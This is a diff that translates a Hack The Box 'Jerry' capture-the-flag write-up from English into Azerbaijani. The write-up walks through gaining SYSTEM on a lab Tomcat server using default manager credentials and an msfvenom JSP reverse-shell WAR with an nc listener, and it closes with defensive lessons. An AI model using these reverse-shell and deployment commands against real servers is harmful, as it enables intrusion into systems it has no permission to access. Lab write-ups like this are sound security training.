@@ -1,39 +1,39 @@
 ﻿# Jerry (HTB)
 
-> Platform: Hack The Box  
+> Platforma: Hack The Box  
 > OS: Windows  
-> Difficulty: Easy  
-> Result: SYSTEM
+> Çətinlik: Asan  
+> Nəticə: SYSTEM
 
 ---
 
 ## Hücum Zənciri
 
 ```text
-Reconnaissance
+Kəşfiyyat
 ├── nmap -p- --min-rate 5000 → 8080 (Apache Tomcat/Coyote JSP engine 1.1)
-└── /manager/html exposed (401 Unauthorized, Basic realm="Tomcat Manager Application")
+└── /manager/html açıqdır (401 Unauthorized, Basic realm="Tomcat Manager Application")
 
-Foothold (Default Credentials)
-├── Default creds tomcat:<PASSWORD> on /manager/html → 200 OK
+İlkin Giriş (Defolt Kredensiallar)
+├── Defolt kredensiallar tomcat:<PASSWORD> /manager/html-də → 200 OK
 ├── msfvenom -p java/jsp_shell_reverse_tcp → shell.war
-├── curl -u tomcat:<PASSWORD> --upload-file shell.war → deploy at /shell
-└── Trigger JSP payload → reverse shell as NT AUTHORITY\SYSTEM
+├── curl -u tomcat:<PASSWORD> --upload-file shell.war → /shell-ə deploy
+└── JSP pеyload-unu işə salmaq → NT AUTHORITY\SYSTEM kimi reverse shell
 
-Flags
+Bayraqlar
 ├── C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt
 ├── user.txt → <USER_FLAG>
 └── root.txt → <ROOT_FLAG>
 ```
 
 > [!NOTE]
-> All flags, passwords, hashes, and session tokens have been masked for ethical reasons.
+> Bütün bayraqlar, şifrələr, heşlər və sessiya tokenləri etik səbəblərə görə gizlədilmişdir.
 
 ---
 
 ## Maşın Brifinqi
 
-Jerry is a straightforward Windows machine hosting an Apache Tomcat 7.0.88 instance. The Tomcat Manager application is protected by default credentials (`tomcat:<PASSWORD>`), which are well-documented in Tomcat's own configuration examples. Once authenticated, the manager allows deploying arbitrary WAR (Web Application Archive) files. By uploading a malicious WAR containing a JSP reverse shell, an attacker gains code execution. Because Tomcat runs with high privileges on this host, the shell is obtained as `NT AUTHORITY\SYSTEM`.
+Jerry - Apache Tomcat 7.0.88 olan sadə Windows maşınıdır. Tomcat Manager tətbiqi Tomcat konfiqurasiya nümunələrində yaxşı sənədləşdirilmiş defolt kredensiallarla (`tomcat:<PASSWORD>`) qorunur. Autentifikasiyadan sonra menecer ixtiyari WAR (Web Application Archive) fayllarını yerləşdirməyə imkan verir. JSP reverse shell olan zərərli WAR yükləyərək hücumçu kod icrası əldə edir. Bu hostda Tomcat yüksək imtiyazlarla işlədiyi üçün shell `NT AUTHORITY\SYSTEM` kimi əldə edilir.
 
 ---
 
@@ -61,11 +61,11 @@ PORT     STATE SERVICE VERSION
 |_http-title: Apache Tomcat/7.0.88
 ```
 
-The service is Apache Tomcat version 7.0.88. The web interface reveals the manager and host-manager applications.
+Xidmət - Apache Tomcat versiya 7.0.88. Veb interfeysi manager və host-manager tətbiqlər + i göstərir.
 
-### Veb Sadalanma
+### Veb Kəşfiyyatı
 
-Navigating to `http://jerry.htb:8080/` shows the default Tomcat page. The `/manager/html` endpoint requires authentication:
+`http://jerry.htb:8080/` ünvanına keçid standart Tomcat səhifəsini göstərir. `/manager/html` endpoint-i autentifikasiya tələb edir:
 
 ```bash
 curl -s -i http://jerry.htb:8080/manager/html | head -10
@@ -77,7 +77,7 @@ Server: Apache-Coyote/1.1
 WWW-Authenticate: Basic realm="Tomcat Manager Application"
 ```
 
-This confirms the Tomcat Manager exists and is protected by Basic authentication.
+Bu, Tomcat Manager-in mövcud olduğunu və Basic autentifikasiya ilə qorunduğunu təsdiqləyir.
 
 ---
 
@@ -87,7 +87,7 @@ No CVE (custom vulnerability) - the Apache Tomcat Manager is configured with def
 
 ### Defolt Kredensiallar
 
-Tomcat's own documentation and error messages sometimes reference this credential pair as an example. Attempting to log in to `/manager/html` with `tomcat:<PASSWORD>` grants access:
+Tomcat sənədləri və xəta mesajları bəzən bu cütlüyə nümunə kimi istinad edir. `/manager/html`-ə `tomcat:<PASSWORD>` ilə daxil olmaq cəhdi giriş verir:
 
 ```bash
 curl -s -i -u tomcat:<PASSWORD> http://jerry.htb:8080/manager/html | head -10
@@ -105,7 +105,7 @@ Content-Type: text/html;charset=utf-8
 
 ### WAR Deploy
 
-The Manager interface provides a "Deploy" section that accepts `.war` files. Generate a malicious WAR file using `msfvenom`:
+Manager interfeysi `.war` fayllarını qəbul edən "Deploy" bölməsini təqdim edir. `msfvenom` istifadə edərək zərərli WAR yaradırıq:
 
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.76 LPORT=4444 -f war -o shell.war
@@ -117,13 +117,13 @@ Final size of war file: 1091 bytes
 Saved as: shell.war
 ```
 
-Start a listener:
+Listener işə salırıq:
 
 ```bash
 nc -lvnp 4444
 ```
 
-Deploy the WAR via the Manager:
+WAR-ı Manager vasitəsilə deploy edirik:
 
 ```bash
 curl -u tomcat:<PASSWORD> --upload-file shell.war "http://jerry.htb:8080/manager/text/deploy?path=/shell&update=true"
@@ -133,7 +133,7 @@ curl -u tomcat:<PASSWORD> --upload-file shell.war "http://jerry.htb:8080/manager
 OK - Deployed application at context path /shell
 ```
 
-Identify the JSP file inside the archive:
+Arxivin içindəki JSP faylının adını müəyyən edirik:
 
 ```bash
 jar tf shell.war
@@ -145,13 +145,13 @@ WEB-INF/web.xml
 afhxosamxq.jsp
 ```
 
-Trigger the payload by requesting the JSP file:
+JSP faylını tələb edərək pеyload-u işə salırıq:
 
 ```bash
 curl http://jerry.htb:8080/shell/afhxosamxq.jsp
 ```
 
-The listener receives a connection:
+Listener bağlantı alır:
 
 ```
 connect to [10.10.15.76] from (UNKNOWN) [10.129.136.9] 49192
@@ -166,7 +166,7 @@ C:\apache-tomcat-7.0.88>
 
 ### Səlahiyyətlərin Artırılması
 
-No privilege escalation is required. The Tomcat service runs as `NT AUTHORITY\SYSTEM`, so the reverse shell is already running with the highest privileges on the host.
+Səlahiyyətlərin аrtırılması tələb olunmur. Tomcat xidməti `NT AUTHORITY\SYSTEM` kimi işləyir, buna görə də reverse shell artıq hostda maksimum imtiyazlara malikdir.
 
 ```cmd
 whoami
@@ -192,7 +192,7 @@ OS Version:                6.3.9600 N/A Build 9600
 
 ## Bayraqlar
 
-Both flags are located in `C:\Users\Administrator\Desktop\flags\`:
+Hər iki bayraq `C:\Users\Administrator\Desktop\flags\` qovluğundadır:
 
 ```cmd
 type "C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt"
@@ -213,16 +213,16 @@ root.txt
 
 ## Bayraqlar
 
-| Flag | Value          |
-|------|----------------|
-| User | `<USER_FLAG>`  |
-| Root | `<ROOT_FLAG>`  |
+| Bayraq | Dəyər          |
+|--------|----------------|
+| User   | `<USER_FLAG>`  |
+| Root   | `<ROOT_FLAG>`  |
 
 ---
 
 ## Əsas Nəticələr
 
-- **Default credentials are a critical risk.** The `tomcat:<PASSWORD>` pair is documented in Tomcat's own examples; leaving it unchanged on an exposed manager interface is equivalent to no authentication.
-- **WAR deployment is a built-in feature, not a vulnerability.** The Tomcat Manager is designed to deploy applications. If an attacker gains access, this feature becomes the exploitation vector.
-- **Tomcat often runs with high privileges on Windows.** Gaining a shell via Tomcat frequently results in `SYSTEM`, bypassing the need for local privilege escalation.
-- **Both flags in one file.** Jerry places both user and root flags in a single file (`2 for the price of 1.txt`), a rare convenience for the attacker.
+- **Defolt kredensiallar kritik riskdir.** `tomcat:<PASSWORD>` cütlüyü Tomcat nümunələrində sənədləşdirilib; onu açıq menecer interfeysində dəyişmədən saxlamaq autentifikasiyanın olmamasına bərabərdir.
+- **WAR deploy daxili funksiyadır, zəiflik deyil.** Tomcat Manager tətbiqləri yerləşdirmək üçün nəzərdə tutulub. Əgər hücumçu giriş əldə edərsə, bu funksiya istismar vektoruna çevrilir.
+- **Tomcat Windows-da tez-tez yüksək imtiyazlarla işləyir.** Tomcat vasitəsilə shell əldə etmək tez-tez `SYSTEM` verir və lokal səlahiyyət artımına ehtiyacı aradan qaldırır.
+- **Hər iki bayraq bir fayldadır.** Jerry hər iki bayrağı (user və root) bir faylda (`2 for the price of 1.txt`) yerləşdirir ki, bu da hücumçu üçün nadir rahatlıqdır.
